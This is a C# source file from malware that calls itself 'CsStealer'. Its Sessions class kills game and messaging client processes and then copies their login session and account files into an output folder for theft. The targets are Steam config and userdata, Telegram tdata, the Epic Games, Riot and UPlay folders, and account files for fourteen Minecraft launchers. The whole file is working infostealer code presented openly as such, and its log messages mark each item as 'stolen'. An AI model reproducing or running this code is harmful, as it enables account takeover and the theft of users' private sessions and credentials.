using System;
using System.Diagnostics;

namespace CsStealer
{
    public class Sessions
    {
        public static string OutputDir = Config.OutputDir;

        private static void CopyTree(string sourcePath, string targetPath, bool overwrite = false)
        {
            if (!Directory.Exists(sourcePath))
                return;

            Directory.CreateDirectory(targetPath);

            foreach (string filePath in Directory.GetFiles(sourcePath))
            {
                string destFile = Path.Combine(targetPath, Path.GetFileName(filePath));
                try
                {
                    File.Copy(filePath, destFile, overwrite);
                }
                catch
                {
                }
            }

            foreach (string directory in Directory.GetDirectories(sourcePath))
            {
                string destDir = Path.Combine(targetPath, Path.GetFileName(directory));
                CopyTree(directory, destDir, overwrite);
            }
        }

        private static void KillProcess(string ProcessName)
        {
            try
            {
                Process[] TargetProcesses = Process.GetProcessesByName(ProcessName);

                foreach (Process Proc in TargetProcesses)
                {
                    try
                    {
                        Proc.Kill();
                        Debugger.Debug("INFO", $"Killed {Proc.ProcessName}");
                    }
                    catch (Exception ex)
                    {
                        Debugger.Debug("WARNING", $"Couldn't kill {Proc.ProcessName} : {ex.Message}");
                    }
                }
            }
            catch
            {
                Debugger.Debug("WARNING", $"The process {ProcessName} was not found");
            }
        }

        public static void GetRiot()
        {
            string DistPath = Path.Combine(OutputDir, "Sessions", "Riot Games");
            string RiotPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Riot Games");

            KillProcess("RiotClientCrashHandler.exe");

            if (Directory.Exists(RiotPath))
            {
                if (!Directory.Exists(DistPath)) Directory.CreateDirectory(DistPath);
                CopyTree(RiotPath, DistPath);
                Debugger.Debug("INFO", "Riot Games session stolen");
            }
            else
            {
                Debugger.Debug("INFO", "Riot Games not installed.");
            }
        }

        public static void GetSteam()
        {
            string DistPath = Path.Combine(OutputDir, "Sessions", "Steam");
            string SteamPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam");
            string[] TargetPathes = { Path.Combine(SteamPath, "config"), Path.Combine(SteamPath, "userdata") };

            KillProcess("steam");

            foreach (string TargetPath in TargetPathes)
            {
                if (Directory.Exists(TargetPath))
                {
                    if (!Directory.Exists(DistPath)) Directory.CreateDirectory(DistPath);
                    CopyTree(TargetPath, DistPath);
                    Debugger.Debug("INFO", "Config/UserData for steam stolen");
                }
                else
                {
                    Debugger.Debug("INFO", "Config/UserData not found : Steam may not be correctly installed or the user is not logged in");
                }
            }
        }

        public static void GetEpic()
        {
            string DistPath = Path.Combine(OutputDir, "Sessions", "Epic Games");
            string EpicPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EpicGamesLauncher");
            string TargetPath = Path.Combine(EpicPath, "Saved", "Config", "Windows");

            KillProcess("EpicGamesLauncher");

            if (Directory.Exists(TargetPath))
            {
                Directory.CreateDirectory(DistPath);
                CopyTree(TargetPath, DistPath);
                Debugger.Debug("INFO", "EpicGames config stolen");
            }
            else
            {
                Debugger.Debug("INFO", "Epic Games is not installed or the user is not logged in");
            }
        }

        public static void GetTelegram()
        {
            string DistPath = Path.Combine(OutputDir, "Sessions", "Telegram");
            string TelegramPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");
            string TargetPath = Path.Combine(TelegramPath, "tdata");

            KillProcess("telegram");

            if (Directory.Exists(TargetPath))
            {
                Directory.CreateDirectory(DistPath);
                CopyTree(TargetPath, DistPath);
                Debugger.Debug("INFO", "Telegram config stolen");
            }
            else
            {
                Debugger.Debug("INFO", "Telegram Desktop is not installed or the user is not logged in");
            }
        }

        public static void GetMinecraft()
        {
            string DistPath = Path.Combine(OutputDir, "Sessions", "Minecraft");
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            Dictionary<string, string> MinecraftApps = new Dictionary<string, string>
        {
            {"Intent", Path.Combine(userProfile, "intentlauncher", "launcherconfig")},
            {"Lunar", Path.Combine(userProfile, ".lunarclient", "settings", "game", "accounts.json")},
            {"TLauncher", Path.Combine(roaming, ".minecraft", "TlauncherProfiles.json")},
            {"Feather", Path.Combine(roaming, ".feather", "accounts.json")},
            {"Meteor", Path.Combine(roaming, ".minecraft", "meteor-client", "accounts.nbt")},
            {"Impact", Path.Combine(roaming, ".minecraft", "Impact", "alts.json")},
            {"Novoline", Path.Combine(roaming, ".minectaft", "Novoline", "alts.novo")},
            {"CheatBreakers", Path.Combine(roaming, ".minecraft", "cheatbreaker_accounts.json")},
            {"Microsoft Store", Path.Combine(roaming, ".minecraft", "launcher_accounts_microsoft_store.json")},
            {"Rise", Path.Combine(roaming, ".minecraft", "Rise", "alts.txt")},
            {"Rise (Intent)", Path.Combine(userProfile, "intentlauncher", "Rise", "alts.txt")},
            {"Paladium", Path.Combine(roaming, "paladium-group", "accounts.json")},
            {"PolyMC", Path.Combine(roaming, "PolyMC", "accounts.json")},
            {"Badlion", Path.Combine(roaming, "Badlion Client", "accounts.json")},
        };

            foreach (KeyValuePair<string, string> Pair in MinecraftApps)
            {
                string AppName = Pair.Key;
                string AppPath = Pair.Value;
                string OutDir = Path.Combine(DistPath, AppName);

                if (Path.Exists(AppPath))
                {
                    if (!Directory.Exists(DistPath)) Directory.CreateDirectory(DistPath);
                    Directory.CreateDirectory(OutDir);

                    try
                    {
                        if (Directory.Exists(AppPath))
                        {
                            CopyTree(AppPath, OutDir);
                        }
                        else if (File.Exists(AppPath))
                        {
                            string fileName = Path.GetFileName(AppPath);
                            string destFile = Path.Combine(OutDir, fileName);
                            File.Copy(AppPath, destFile, true);
                        }

                        Debugger.Debug("INFO", $"{AppName} (Minecraft session) stolen");
                    }
                    catch (Exception ex)
                    {
                        Debugger.Debug("ERROR", $"{AppName} (Minecraft session) was found but couldn't be stolen : {ex.Message}");
                    }
                }
            }
        }

        public static void GetUPlay()
        {
            string DistPath = Path.Combine(OutputDir, "Sessions", "UPlay");
            string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string UplayPath = Path.Combine(LocalAppData, "Ubisoft Game Launcher");

            if (Directory.Exists(UplayPath))
            {
                Directory.CreateDirectory(DistPath);
                CopyTree(UplayPath, DistPath);
                Debugger.Debug("INFO", "UPlay config stolen");
            }
            else
            {
                Debugger.Debug("INFO", "UPlay is not installed or the user is not logged in");
            }
        }
    }
}